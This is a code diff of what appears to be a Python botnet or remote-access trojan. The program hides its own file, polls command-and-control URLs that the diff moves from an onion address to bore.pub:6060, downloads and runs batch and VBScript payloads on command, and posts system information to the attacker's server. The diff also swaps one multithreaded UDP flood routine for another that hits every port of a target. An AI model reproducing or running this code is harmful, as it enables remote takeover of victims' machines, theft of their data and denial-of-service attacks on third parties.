@@ -18,12 +18,6 @@ import sys
 import socks
 import zipfile
 import getpass
-from socket import socket, AF_INET, SOCK_DGRAM
-from threading import Thread
-from random import choices, randint
-from time import time, sleep
-from pystyle import *
-from getpass import getpass as hinput
 proxies = {
     'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
     'https': 'socks5h://127.0.0.1:9150'  # Tor proxy address and port for HTTPS
@@ -56,6 +50,7 @@ subprocess.Popen("attrib +h BN.pyw", shell=True)
 #A.daemon = True
 #A.start()
 
+
 def METASPLOIT(): 
   
     actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
@@ -64,7 +59,7 @@ def METASPLOIT():
     previous_data = ""
   
     while True:
-     url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Metasploit.php'
+     url = 'http://bore.pub:6060/Metasploit.php'
      time.sleep(5)
      response = requests_session.get(url)
 
@@ -94,7 +89,7 @@ def METASPLOIT():
                     restart_program()
                 elif option == "STARTVBSBAT":
                     os.system("cls")
-                    php_script_url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Control.php'
+                    php_script_url = 'http://bore.pub:6060/Control.php'
                     home_directory = os.path.expanduser("~")
                     web_page1_path = os.path.join(home_directory, "Script.bat")
                     vbs_file_path = os.path.join(home_directory, "VBSEX.vbs")
@@ -103,8 +98,8 @@ def METASPLOIT():
                         if os.path.exists(file_path):
                             os.remove(file_path)
 
-                    url1 = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Script.io"
-                    url2 = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/VBSEX.io"
+                    url1 = "http://bore.pub:6060/Script.io"
+                    url2 = "http://bore.pub:6060/VBSEX.io"
 
                     download_file(url1, web_page1_path)
                     download_file(url2, vbs_file_path)
@@ -153,131 +148,72 @@ def METASPLOIT():
                     for thread in threads:
                      thread.join()
                 elif option == "UDOS":
-                    class Brutalize:
-                        def __init__(self, ip, port, force, threads):
-                            self.ip = ip
-                            self.port = port
-                            self.force = force # default: 1250
-                            self.threads = threads # default: 100
-                            self.client = socket(family=AF_INET, type=SOCK_DGRAM)
-                            self.data = str.encode("x" * self.force)
-                            self.len = len(self.data)
-                        def flood(self):
-                            self.on = True
-                            self.sent = 0
-                            for _ in range(self.threads):
-                                Thread(target=self.send).start()
-                            Thread(target=self.info).start()  
-                        def info(self):
-                            interval = 0.05
-                            now = time()
-                            size = 0
-                            self.total = 0
-                            bytediff = 8
-                            mb = 1000000
-                            gb = 1000000000
-                            while self.on:
-                                sleep(interval)
-                                if not self.on:
-                                    break
-                                if size != 0:
-                                    self.total += self.sent * bytediff / gb * interval
-                                    print(stage(f"{fluo}{round(size)} {white}Mb/s {purple}-{white} Total: {fluo}{round(self.total, 1)} {white}Gb. {' '*20}"), end='\r')
-                                now2 = time()     
-                                if now + 1 >= now2:
-                                    continue       
-                                size = round(self.sent * bytediff / mb)
-                                self.sent = 0
-                                now += 1
-                        def stop(self):
-                            self.on = False
-                        def send(self):
-                            while self.on:
-                                try:
-                                    self.client.sendto(self.data, self._randaddr())
-                                    self.sent += self.len
-                                except:
-                                    pass
-                        def _randaddr(self):
-                            return (self.ip, self._randport())
-                        def _randport(self):
-                            return self.port or randint(1, 65535)
-                    fluo = Col.light_red
-                    fluo2 = Col.light_blue
-                    white = Col.white
-                    blue = Col.StaticMIX((Col.blue, Col.black))
-                    bpurple = Col.StaticMIX((Col.purple, Col.black, blue))
-                    purple = Col.StaticMIX((Col.purple, blue, Col.white))
-                    def init():
-                        System.Size(140, 40)                             
-                        Cursor.HideCursor()
-                    init()
-                    def stage(text, symbol = '...'):
-                        col1 = purple
-                        col2 = white
-                        return f" {Col.Symbol(symbol, col2, col1, '{', '}')} {col2}{text}"
-                    def error(text, start='\n'):
-                        hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
-                        exit()
-                    def main():
-                        print()
-                        ip = input(stage(target))
-                        print()
-                        try:
-                            if ip.count('.') != 3:
-                                int('error')
-                            int(ip.replace('.',''))
-                        except:
-                            pass
-                        port = ''
-                        print()
-                        if port == '':
-                            port = None 
-                        else:
-                            try:
-                                port = int(port)
-                                if port not in range(1, 65535 + 1):
-                                    int('error')
-                            except ValueError:
-                                   pass
-                        force = ''
-                        print()
+                 def UDOS():  
+                  class UDPPacketFlood:
+                     def __init__(self, target_ip, target_port, packet_size, num_threads, port_range=None):
+                         self.target_ip = target_ip
+                         self.target_port = target_port
+                         self.packet_size = packet_size
+                         self.num_threads = num_threads
+                         self.client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                         self.data = b'x' * self.packet_size
+                         self.total_sent_bytes = 0
+                         self.port_range = port_range
 
-                        if force == '':
-                            force = 1250
-                        else:
-                            try:
-                                force = int(force)
-                            except ValueError:
-                                pass
-                        threads = ''
-                        print()
-                        if threads == '':
-                            threads = 100
-                        else:
-                            try:
-                                threads = int(threads)
-                            except ValueError:
-                                pass
-                        print()
-                        cport = '' if port is None else f'{purple}:{fluo2}{port}'
-                        print(stage(f"Starting attack on {fluo2}{ip}{cport}{white}."), end='\r')
-                        brute = Brutalize(ip, port, force, threads)
-                        try:
-                            brute.flood()
-                        except:
-                            brute.stop()
-                        try:
-                            while True:
-                                sleep(1000000)
-                        except KeyboardInterrupt:
-                            brute.stop()
-                        print('\n')
-                        sleep(1)
-                    if __name__ == '__main__':
-                        main()          
-            
+                     def flood(self):
+                         self.threads = []
+                         self.start_time = time.time()
+                         self.stop_event = threading.Event()
 
+                         if not self.target_port and self.port_range:
+                             print("Testing all ports in the specified range...")
+                         else:
+                             print(f"Sending packets to {self.target_ip}:{self.target_port}...")
+
+                         for _ in range(self.num_threads):
+                             thread = threading.Thread(target=self.send_packet)
+                             thread.daemon = True
+                             thread.start()
+                             self.threads.append(thread)
+
+                         try:
+                             while True:
+                                 pass
+                         except KeyboardInterrupt:
+                             self.stop()
+
+                     def send_packet(self):
+                         while not self.stop_event.is_set():
+                             try:
+                                 if self.port_range:
+                                     for port in self.port_range:
+                                         self.client.sendto(self.data, (self.target_ip, port))
+                                         self.total_sent_bytes += self.packet_size
+                                 else:
+                                     self.client.sendto(self.data, (self.target_ip, self.target_port))
+                                     self.total_sent_bytes += self.packet_size
+                             except:
+                                 pass
+
+                     def stop(self):
+                         self.stop_event.set()
+                         for thread in self.threads:
+                             thread.join()
+                         elapsed_time = time.time() - self.start_time
+                         print(f"Flood Stopped. Sent {self.total_sent_bytes / 1024:.2f} KB in {elapsed_time:.2f} seconds.")
+
+                  if __name__ == '__main__':
+                     target_ip = target
+                     target_port = ''
+                     packet_size = 1250  # Bytes per packet
+                     num_threads = 100
+                     port_range = range(1, 65536) if not target_port else None
+                     flood = UDPPacketFlood(target_ip, target_port, packet_size, num_threads, port_range)
+                     flood.flood()
+                 specific_code_thread = threading.Thread(target=UDOS)
+                 specific_code_thread.daemon = True
+                 specific_code_thread.start()
+ 
             if mac == actual_mac:
 
                 if option == "START":
@@ -388,9 +324,9 @@ def MEATSERVICE():
         except:
             pass
 
-specific_code_thread = threading.Thread(target=MEATSERVICE)
-specific_code_thread.daemon = True  
-specific_code_thread.start()
+MEATSERVICE = threading.Thread(target=MEATSERVICE)
+MEATSERVICE.daemon = True  
+MEATSERVICE.start()
 
 def get_system_info():
     try:
@@ -434,7 +370,7 @@ def get_system_info():
         session = requests.Session()
         session.proxies = proxies
 
-        url = "http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Save.php"
+        url = "http://bore.pub:6060/Save.php"
         data = data_to_send
         response = requests_session.post(url, data=data)
         print(response.text)
@@ -450,7 +386,7 @@ while True:
         def receive_data():
             global previous_command, previous_files
             while True:
-                php_script_url = 'http://xj6y6rzza3e47mclwxlelrfkzvo7zbzpiafcaxikiqajh7klb7gko5qd.onion/Control.php'
+                php_script_url = 'http://bore.pub:6060/Control.php'
                 
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
